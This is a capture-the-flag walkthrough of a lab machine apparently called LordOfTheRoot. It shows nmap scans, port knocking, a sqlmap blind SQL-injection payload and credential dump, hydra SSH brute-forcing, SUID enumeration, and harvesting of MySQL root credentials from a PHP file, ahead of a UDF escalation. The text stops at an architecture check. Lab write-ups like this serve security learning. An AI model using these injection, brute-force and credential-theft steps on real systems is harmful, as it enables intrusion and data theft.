# Ports Scan & Enumeration
## Ports Scan
```bash
└─$ nmap -Pn -sC -sV 192.168.59.137
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 15:59 AEST
Nmap scan report for 192.168.59.137
Host is up (0.0029s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

- Woooo, this is new. So I did a full ports scan as well, maybe I should do a UDP scan too.
```bash
└─$ nmap -Pn -p- 192.168.59.137
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 15:56 AEST
Nmap scan report for 192.168.59.137
Host is up (0.0015s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 107.78 seconds

└─$ sudo nmap -sU -v 192.168.59.137                                                                             1 ⨯
[sudo] password for htb:
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 16:01 AEST
Initiating ARP Ping Scan at 16:01
Scanning 192.168.59.137 [1 port]
Completed ARP Ping Scan at 16:01, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:01
Completed Parallel DNS resolution of 1 host. at 16:01, 0.20s elapsed
Initiating UDP Scan at 16:01
Scanning 192.168.59.137 [1000 ports]
Completed UDP Scan at 16:02, 21.30s elapsed (1000 total ports)
Nmap scan report for 192.168.59.137
Host is up (0.00063s latency).
All 1000 scanned ports on 192.168.59.137 are open|filtered
MAC Address: 00:0C:29:73:85:AA (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 21.70 seconds
           Raw packets sent: 2001 (91.523KB) | Rcvd: 12 (1.265KB)
```

- So have to where to go, poke ssh:
```bash
└─$ ssh 192.168.59.137
The authenticity of host '192.168.59.137 (192.168.59.137)' can't be established.
ECDSA key fingerprint is SHA256:XzDLUMxo8ifHi4SciYJYj702X3PfFwaXyKOS07b6xd8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.59.137' (ECDSA) to the list of known hosts.

                                                  .____    _____________________________
                                                  |    |   \_____  \__    ___/\______   \
                                                  |    |    /   |   \|    |    |       _/
                                                  |    |___/    |    \    |    |    |   \
                                                  |_______ \_______  /____|    |____|_  /
                                                          \/       \/                 \/
 ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
Easy as 1,2,3
htb@192.168.59.137's password:
```

- Oh, this triggered my memory, hahaha, I was stuck here for very long time, and then finally figure out it's a port knocking. Because the banner of ssh says "Later, Knock Friend to Enter"
![](Pasted%20image%2020210526161520.png)
- Weird, but I knocked, still got no new port
```bash
┌──(htb㉿kali)-[/opt]
└─$  ./knock -v 192.168.59.137 1 2 3
hitting tcp 192.168.59.137:1
hitting tcp 192.168.59.137:2
hitting tcp 192.168.59.137:3

┌──(htb㉿kali)-[/opt]
└─$ nmap -Pn -v 192.168.59.137
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 16:16 AEST
Initiating Parallel DNS resolution of 1 host. at 16:16
Completed Parallel DNS resolution of 1 host. at 16:16, 0.19s elapsed
Initiating Connect Scan at 16:16
Scanning 192.168.59.137 [1000 ports]
Discovered open port 22/tcp on 192.168.59.137
Completed Connect Scan at 16:16, 6.54s elapsed (1000 total ports)
Nmap scan report for 192.168.59.137
Host is up (0.0019s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

- My bad, it's the port out of 1000 range....
```bash
└─$ nmap -Pn -p- -vvv 192.168.59.137
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 16:43 AEST
Initiating Parallel DNS resolution of 1 host. at 16:43
Completed Parallel DNS resolution of 1 host. at 16:43, 0.19s elapsed
DNS resolution of 1 IPs took 0.19s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 16:43
Scanning 192.168.59.137 [65535 ports]
Discovered open port 22/tcp on 192.168.59.137
Connect Scan Timing: About 19.71% done; ETC: 16:45 (0:02:06 remaining)
Connect Scan Timing: About 47.80% done; ETC: 16:45 (0:01:07 remaining)
Discovered open port 1337/tcp on 192.168.59.137
Completed Connect Scan at 16:45, 104.82s elapsed (65535 total ports)
Nmap scan report for 192.168.59.137
Host is up, received user-set (0.0022s latency).
Scanned at 2021-05-26 16:43:21 AEST for 105s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
1337/tcp open  waste   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 105.13 seconds

└─$ nmap -Pn -p1337 -sC -sV 192.168.59.137
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 16:46 AEST
Nmap scan report for 192.168.59.137
Host is up (0.00099s latency).

PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
```

- A web site!

## Web Service Enum
### nikto
```bash
└─$ nikto -host 192.168.59.137:1337
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.59.137
+ Target Hostname:    192.168.59.137
+ Target Port:        1337
+ Start Time:         2021-05-26 16:47:14 (GMT10)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7917 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-05-26 16:48:12 (GMT10) (58 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### gobuster
```bash
└─$ gobuster dir -u http://192.168.59.137:1337 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,html,sh,jsp,asp,aspx,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.59.137:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              asp,aspx,php,txt,html,sh,jsp
[+] Timeout:                 10s
===============================================================
2021/05/26 16:51:06 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 323] [--> http://192.168.59.137:1337/images/]
/index.html           (Status: 200) [Size: 64]
/404.html             (Status: 200) [Size: 116]
/server-status        (Status: 403) [Size: 296]

===============================================================
2021/05/26 17:23:14 Finished
===============================================================
```

- Nothing too interesting. And I did browse the website, there's images on different pages, one for index.html, one for 404.html.
```bash
└─$ curl -s http://192.168.59.137:1337/images/ | html2text
****** Index of /images ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[IMG]]       hipster.jpg      2015-09-17 16:23  71K  
[[IMG]]       iwilldoit.jpg    2015-09-17 16:25  36K  
[[IMG]]       legolas.jpg      2015-09-17 16:26 175K  
===========================================================================
     Apache/2.4.7 (Ubuntu) Server at 192.168.59.137 Port 1337
```

- I did check through all of them, but don't think there's anything interesting.
```bash
└─$ exiftool *.jpg
======== hipster.jpg
ExifTool Version Number         : 12.16
File Name                       : hipster.jpg
Directory                       : .
File Size                       : 71 KiB
File Modification Date/Time     : 2015:09:18 08:23:44+10:00
File Access Date/Time           : 2021:05:26 17:45:44+10:00
File Inode Change Date/Time     : 2021:05:26 17:45:44+10:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Media-Relative Colorimetric
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Software                        : Adobe Photoshop Elements 9.0 Macintosh
Modify Date                     : 2011:02:23 22:52:40
Color Space                     : sRGB
Exif Image Width                : 500
Exif Image Height               : 284
Image Width                     : 500
Image Height                    : 284
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 500x284
Megapixels                      : 0.142
======== iwilldoit.jpg
ExifTool Version Number         : 12.16
File Name                       : iwilldoit.jpg
Directory                       : .
File Size                       : 36 KiB
File Modification Date/Time     : 2015:09:18 08:25:16+10:00
File Access Date/Time           : 2021:05:26 17:45:52+10:00
File Inode Change Date/Time     : 2021:05:26 17:45:52+10:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 336
Image Height                    : 512
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 336x512
Megapixels                      : 0.172
======== legolas.jpg
ExifTool Version Number         : 12.16
File Name                       : legolas.jpg
Directory                       : .
File Size                       : 175 KiB
File Modification Date/Time     : 2015:09:18 08:26:48+10:00
File Access Date/Time           : 2021:05:26 17:46:02+10:00
File Inode Change Date/Time     : 2021:05:26 17:46:02+10:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90.
Image Width                     : 887
Image Height                    : 820
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 887x820
Megapixels                      : 0.727
    3 image files read

┌──(htb㉿kali)-[/dev/shm]
└─$ binwalk *.jpg

Scan Time:     2021-05-26 17:46:59
Target File:   /dev/shm/hipster.jpg
MD5 Checksum:  29425e00ead5e30a8ce955093ee64179
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
382           0x17E           Copyright string: "Copyright (c) 1998 Hewlett-Packard Company"
3192          0xC78           TIFF image data, big-endian, offset of first image directory: 8


Scan Time:     2021-05-26 17:46:59
Target File:   /dev/shm/iwilldoit.jpg
MD5 Checksum:  1019a039755c918c6fdbfcbd5facb7f9
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


Scan Time:     2021-05-26 17:46:59
Target File:   /dev/shm/legolas.jpg
MD5 Checksum:  80e09e26cbdce6cb8bc66f04f6823838
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

- Tried to for some non existing pages, always got the same page, so guess it's a 404 page:
![](Pasted%20image%2020210528161057.png)
- But check the source code get something interesting, and this is not be seeing everytime:
![](Pasted%20image%2020210528161149.png)
- Check the codes:
```bash
└─$ echo THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh | base64 -d
Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!

┌──(htb㉿kali)-[~]
└─$ echo Lzk3ODM0NTIxMC9pbmRleC5waHA= | base64 -d
/978345210/index.php
```

- A login page:
![](Pasted%20image%2020210528161259.png)

- No clue by tried some common username, just got wrong username and password prompt. So save the request by burp and run sqlmap on it.
- This is the first time that I got error from the req:
```bash
└─$ sqlmap -o -r req --dbs --batch                                                                            130 ⨯
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.5#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:23:49 /2021-05-28/

[16:23:49] [INFO] parsing HTTP request from 'req'
it appears that provided value for POST parameter 'submit' has boundaries. Do you want to inject inside? (' Login* ') [y/N] N
[16:23:49] [INFO] resuming back-end DBMS 'mysql'
[16:23:49] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.59.137:1337/978345210/profile.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 1040 FROM (SELECT(SLEEP(5)))qxVN) AND 'vJya'='vJya&password=test&submit= Login
---
[16:23:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: PHP 5.5.9, Apache 2.4.7
back-end DBMS: MySQL >= 5.0.12
[16:23:52] [INFO] fetching database names
[16:23:52] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
[16:23:52] [INFO] resumed: 4
[16:23:52] [INFO] resuming partial value: i
[16:23:52] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[16:23:59] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
[16:24:09] [INFO] adjusting time delay to 1 second due to good response times
[16:24:11] [WARNING] detected HTTP code '302' in validation phase is differing from expected '200'
[16:24:11] [ERROR] invalid character detected. retrying..
[16:24:11] [WARNING] increasing time delay to 2 seconds
[16:24:21] [ERROR] invalid character detected. retrying..
[16:24:21] [WARNING] increasing time delay to 3 seconds
[16:24:37] [ERROR] invalid character detected. retrying..
[16:24:37] [WARNING] increasing time delay to 4 seconds
[16:24:57] [ERROR] invalid character detected. retrying..
[16:24:57] [WARNING] increasing time delay to 5 seconds
[16:25:23] [ERROR] invalid character detected. retrying..
[16:25:23] [WARNING] increasing time delay to 6 seconds
[16:25:53] [ERROR] unable to properly validate last character value ('n')..
n
[16:25:57] [ERROR] invalid character detected. retrying..
[16:25:57] [WARNING] increasing time delay to 2 seconds
[16:26:03] [ERROR] invalid character detected. retrying..
[16:26:03] [WARNING] increasing time delay to 3 seconds
[16:26:13] [ERROR] invalid character detected. retrying..
[16:26:13] [WARNING] increasing time delay to 4 seconds
[16:26:25] [ERROR] invalid character detected. retrying..
[16:26:25] [WARNING] increasing time delay to 5 seconds
[16:26:41] [ERROR] invalid character detected. retrying..
[16:26:41] [WARNING] increasing time delay to 6 seconds
[16:26:59] [ERROR] unable to properly validate last character value ('f')..
f
[16:27:04] [ERROR] invalid character detected. retrying..
[16:27:04] [WARNING] increasing time delay to 2 seconds
[16:27:12] [ERROR] invalid character detected. retrying..
[16:27:12] [WARNING] increasing time delay to 3 seconds
[16:27:24] [ERROR] invalid character detected. retrying..
[16:27:24] [WARNING] increasing time delay to 4 seconds
[16:27:41] [ERROR] invalid character detected. retrying..
[16:27:41] [WARNING] increasing time delay to 5 seconds
[16:28:01] [ERROR] invalid character detected. retrying..
[16:28:01] [WARNING] increasing time delay to 6 seconds
[16:28:26] [ERROR] unable to properly validate last character value ('o')..
o
[16:28:29] [ERROR] invalid character detected. retrying..
[16:28:29] [WARNING] increasing time delay to 2 seconds
[16:28:35] [ERROR] invalid character detected. retrying..
[16:28:35] [WARNING] increasing time delay to 3 seconds
[16:28:44] [ERROR] invalid character detected. retrying..
[16:28:44] [WARNING] increasing time delay to 4 seconds
[16:28:57] [ERROR] invalid character detected. retrying..
[16:28:57] [WARNING] increasing time delay to 5 seconds
[16:29:12] [ERROR] invalid character detected. retrying..
[16:29:12] [WARNING] increasing time delay to 6 seconds
^C
```

- But there's another technical of login form testing, but it can't use the request file, this one is better because, request file would limit the browse header but this --forms switch let sqlmap to try on different parameters by itself:
```bash
└─$ sqlmap -o -r req --forms --dbs --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.5#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:29:36 /2021-05-28/

[16:29:36] [INFO] parsing HTTP request from 'req'
[16:29:36] [CRITICAL] switch '--forms' requires usage of option '-u' ('--url'), '-g' or '-m'

[*] ending @ 16:29:36 /2021-05-28/

└─$ sqlmap -o -u http://192.168.59.137:1337/978345210/index.php --forms --batch --dbs
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
...[snip]...
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] Webapp

[16:39:42] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/htb/.local/share/sqlmap/output/results-05282021_0436pm.csv'

[*] ending @ 16:39:42 /2021-05-28/
```

- There's something wrong with the result, so I have to go `~/.local/share/sqlmap/output` to remove every history output, and then redo the injection, and then I have the databases, and our target should be the `Webapp`
```bash
└─$ sqlmap -o -u http://192.168.59.137:1337/978345210/index.php --forms --batch -D Webapp --tables
...[snip]...
[16:51:07] [INFO] retrieved:
[16:51:17] [INFO] adjusting time delay to 1 second due to good response times
Users
Database: Webapp
[1 table]
+-------+
| Users |
+-------+

[16:51:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/htb/.local/share/sqlmap/output/results-05282021_0451pm.csv'

[*] ending @ 16:51:30 /2021-05-28/

└─$ sqlmap -o -u http://192.168.59.137:1337/978345210/index.php --forms --batch -D Webapp -T Users --columns
...[snip]...
Database: Webapp
Table: Users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(10)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[17:01:03] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/htb/.local/share/sqlmap/output/results-05282021_0458pm.csv'

[*] ending @ 17:01:03 /2021-05-28/

└─$ sqlmap -o -u http://192.168.59.137:1337/978345210/index.php --forms --batch -D Webapp -T Users -C password,username --dump
...[snip]...
Database: Webapp
Table: Users
[5 entries]
+------------------+----------+
| password         | username |
+------------------+----------+
| AndMyAxe         | gimli    |
| AndMyBow         | legolas  |
| AndMySword       | aragorn  |
| iwilltakethering | frodo    |
| MyPreciousR00t   | smeagol  |
+------------------+----------+

[17:07:54] [INFO] table 'Webapp.Users' dumped to CSV file '/home/htb/.local/share/sqlmap/output/192.168.59.137/dump/Webapp/Users.csv'
[17:07:54] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/htb/.local/share/sqlmap/output/results-05282021_0502pm.csv'

[*] ending @ 17:07:54 /2021-05-28/
```

- So my guess is one of it is ssh username.
```bash
└─$ hydra -L users -P pass ssh://192.168.59.137                                                               255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-28 17:11:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://192.168.59.137:22/
[22][ssh] host: 192.168.59.137   login: smeagol   password: MyPreciousR00t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-28 17:12:26
```

- Now we have a login.
```bash
smeagol@LordOfTheRoot:~$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
smeagol:x:1000:1000:smeagol,,,:/home/smeagol:/bin/bash

smeagol@LordOfTheRoot:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/bin/ping6
/SECRET/door2/file
/SECRET/door1/file
/SECRET/door3/file
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/lppasswd
/usr/bin/traceroute6.iputils
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/X
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
/usr/sbin/pppd
```

- And we have a target, the `SECRET` thing is a bit way too obvious.
```bash
smeagol@LordOfTheRoot:~$ cd /SECRET/
smeagol@LordOfTheRoot:/SECRET$ ls
door1  door2  door3
smeagol@LordOfTheRoot:/SECRET$ find . -ls
 49155    4 drwxr-xr-x   5 root     root         4096 Sep 22  2015 .
 42376    4 drwxr-xr-x   2 root     root         4096 May 28 09:18 ./door2
 47056    8 -rwsr-xr-x   1 root     root         5150 Sep 22  2015 ./door2/file
  6429    4 drwxr-xr-x   2 root     root         4096 May 28 09:18 ./door1
 47022    8 -rwsr-xr-x   1 root     root         7370 Sep 17  2015 ./door1/file
 46508    4 drwxr-xr-x   2 root     root         4096 May 28 09:18 ./door3
 47060    8 -rwsr-xr-x   1 root     root         7370 Sep 17  2015 ./door3/file
 
 smeagol@LordOfTheRoot:/SECRET$ md5sum ./door1/file
f0c663095117d908e16412570d2c6252  ./door1/file
smeagol@LordOfTheRoot:/SECRET$ md5sum ./door2/file
bb0e0e4439b5039e71405f8a1b6d5c0c  ./door2/file
smeagol@LordOfTheRoot:/SECRET$ md5sum ./door3/file
f0c663095117d908e16412570d2c6252  ./door3/file
```

- Now we know door1 and door3 are the same file, only door2 is the one worth study.
```bash
smeagol@LordOfTheRoot:/SECRET/door2$ strings file
/lib/ld-linux.so.2
,x!L
libc.so.6
_IO_stdin_used
strcpy
exit
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
QVh]
[^_]
Syntax: %s <input string>
;*2$"
GCC: (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
...[snip]...
```
- `strcpy`, I hate buffer overflow, but this box has different way to root. :D
- Go poke website, we have mysql db:
```bash
smeagol@LordOfTheRoot:/SECRET/door2$ cd /var/www/html
-bash: cd: /var/www/html: No such file or directory
smeagol@LordOfTheRoot:/SECRET/door2$ find / -name index.php 2>/dev/null
/var/www/978345210/index.php

smeagol@LordOfTheRoot:/SECRET/door2$ ps aux | gerp mysql
No command 'gerp' found, did you mean:
 Command 'grep' from package 'grep' (main)
gerp: command not found
smeagol@LordOfTheRoot:/SECRET/door2$ ps aux
...[snip]...
root      1099  0.0  2.6 326696 27388 ?        Ssl  May26   2:29 /usr/sbin/mysqld
...[snip]...
```

- It's run by root, that's not very often, which means chance.
```bash
smeagol@LordOfTheRoot:/SECRET/door2$ cd /var/www/978345210/
smeagol@LordOfTheRoot:/var/www/978345210$ ls
index.php  login.php  logout.php  profile.php
smeagol@LordOfTheRoot:/var/www/978345210$ nano login.php
...[snip]...
 $db = new mysqli('localhost', 'root', 'darkshadow', 'Webapp');
 ...[snip]...
```

- Now we have root access to mysql;
```bash
smeagol@LordOfTheRoot:/var/www/978345210$ netstat -an
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
```
- It's listen to localhost.
```bash
smeagol@LordOfTheRoot:/var/www/978345210$ mysql -uroot -pdarkshadow -h localhost
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Webapp             |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Webapp             |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_mysql           |
+---------------------------+
| columns_priv              |
| db                        |
| event                     |
| func                      |
| general_log               |
| help_category             |
| help_keyword              |
| help_relation             |
| help_topic                |
| host                      |
| ndb_binlog_index          |
| plugin                    |
| proc                      |
| procs_priv                |
| proxies_priv              |
| servers                   |
| slow_log                  |
| tables_priv               |
| time_zone                 |
| time_zone_leap_second     |
| time_zone_name            |
| time_zone_transition      |
| time_zone_transition_type |
| user                      |
+---------------------------+
24 rows in set (0.00 sec)

```

- This is the details of this exploit:
![](44139-mysql-udf-exploitation.pdf)

- And we can find the udf here from msf:
```bash
└─$ find / -name lib_mysqludf_sys_64.dll -type f 2>/dev/null
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
```

- So let's first time strickly follow the tips, first we have to check the OS and architechture of MySQL instance:
```bash
mysql> select @@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| debian-linux-gnu     | i686                      |
+----------------------+---------------------------+
1 row in set (0.00 sec)

